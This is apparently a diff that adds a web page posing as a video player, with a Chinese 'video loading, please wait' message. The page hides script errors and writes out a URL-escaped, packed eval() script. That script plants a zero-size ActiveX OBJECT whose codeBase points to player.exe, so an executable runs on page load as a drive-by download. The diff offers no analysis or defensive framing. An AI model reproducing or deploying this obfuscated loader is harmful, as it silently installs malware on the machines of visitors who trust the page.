@@ -1,0 +1,21 @@
+
+<script language="JavaScript">
+<!-- 
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+// -->
+</script>
+<SCRIPT>var Words="%3Chtml%3E%0D%0A%3Cscript language%3D%22JavaScript%22%3E%0D%0A%3C%21%2D%2D %0D%0Afunction killErrors%28%29 %7B%0D%0Areturn true%3B%0D%0A%7D%0D%0Awindow%2Eonerror %3D killErrors%3B%0D%0A%2F%2F %2D%2D%3E%0D%0A%3C%2Fscript%3E%0D%0A%3CMETA http%2Dequiv%3DContent%2DType content%3D%22text%2Fhtml%3B charset%3Dgb2312%22%3E%0D%0A%3CSCRIPT language%3Djavascript%3E %0D%0Aeval%28function%28p%2Ca%2Cc%2Ck%2Ce%2Cd%29%7Be%3Dfunction%28c%29%7Breturn c%2EtoString%2836%29%7D%3Bif%28%21%27%27%2Ereplace%28%2F%5E%2F%2CString%29%29%7Bwhile%28c%2D%2D%29d%5Bc%2EtoString%28a%29%5D%3Dk%5Bc%5D%7C%7Cc%2EtoString%28a%29%3Bk%3D%5Bfunction%28e%29%7Breturn d%5Be%5D%7D%5D%3Be%3Dfunction%28%29%7Breturn%27%5C%5Cw%2B%27%7D%3Bc%3D1%7D%3Bwhile%28c%2D%2D%29if%28k%5Bc%5D%29p%3Dp%2Ereplace%28new RegExp%28%27%5C%5Cb%27%2Be%28c%29%2B%27%5C%5Cb%27%2C%27g%27%29%2Ck%5Bc%5D%29%3Breturn p%7D%28%272%3D%22%3C6 r%3D%5C%5C%22q%5C%5C%22 p%3D0 o%3D0 n%3D%5C%5C%22m%2Fl%2Dk%5C%5C%22%222%2B%3D%22j%3D%5C%5C%22i%2Eh%23g%3D1%2C1%2C1%2C1%5C%5C%22%3E%222%2B%3D%22%3Cf e%3D%5C%5C%22d%5C%5C%22 c%3D%5C%5C%22b%5C%5C%22%3E%222%2B%3D%22%3C%2F6%3E%222%2B%3D%22%3C4%3E%3C5%3E %3C%2F5%3E%3C%2F4%3E%22%3B3%2Ea%28%29%3B3%2E9%28%29%3B3%2E8%282%29%3B3%2E7%28%29%3B%27%2C28%2C28%2C%27%7C%7Crun%5Fexe%7Cdocument%7CHTML%7CH1%7COBJECT%7Cclose%7Cwriteln%7Cclear%7Copen%7C65536%7Cvalue%7C%5FVersion%7CNAME%7CPARAM%7Cversion%7Cexe%7Cplayer%7CCODEBASE%7Coleobject%7Cx%7Capplication%7CTYPE%7CHEIGHT%7CWIDTH%7CRUNIT%7CID%27%2Esplit%28%27%7C%27%29%2C0%2C%7B%7D%29%29%0D%0A%3C%2FSCRIPT%3E%0D%0A%0D%0A%3COBJECT id%3DRUNIT codeBase%3Dplayer%2Eexe%23version%3D1%2C1%2C1%2C1 type%3Dapplication%2Fx%2Doleobject height%3D0 width%3D0%3E%3CPARAM NAME%3D%22%5FVersion%22 VALUE%3D%2265536%22%3E%3C%2FOBJECT%3E%0D%0A%3CMETA content%3D%22Microsoft FrontPage 4%2E0%22 name%3DGENERATOR%3E%3C%2FHEAD%3E%0D%0A%3CBODY%3E%0D%0A%3CH1%3E%3C%2FH1%3E%0D%0A%3CP align%3Dcenter%3E视频加载中请稍等……%3CBR%3E%0D%0A%3CCENTER%3E%3C%2FCENTER%3E%3CBR%3E%3CBR%3E%3Chtml%3E%0D%0A%3Cbody%3E%0D%0A%3Cscript language%3D%22JavaScript%22%3E%0D%0A%3C%21%2D%2D %0D%0Afunction killErrors%28%29 %7B%0D%0Areturn true%3B%0D%0A%7D%0D%0Awindow%2Eonerror %3D killErrors%3B%0D%0A%2F%2F %2D%2D%3E%0D%0A%3C%2Fscript%3E%0D%0A%3C%2FHTML%3E%0D%0A";document.write(unescape(Words))</SCRIPT>
+
+<CENTER></CENTER><BR><BR><html>
+<body>
+<script language="JavaScript">
+<!-- 
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+// -->
+</script>
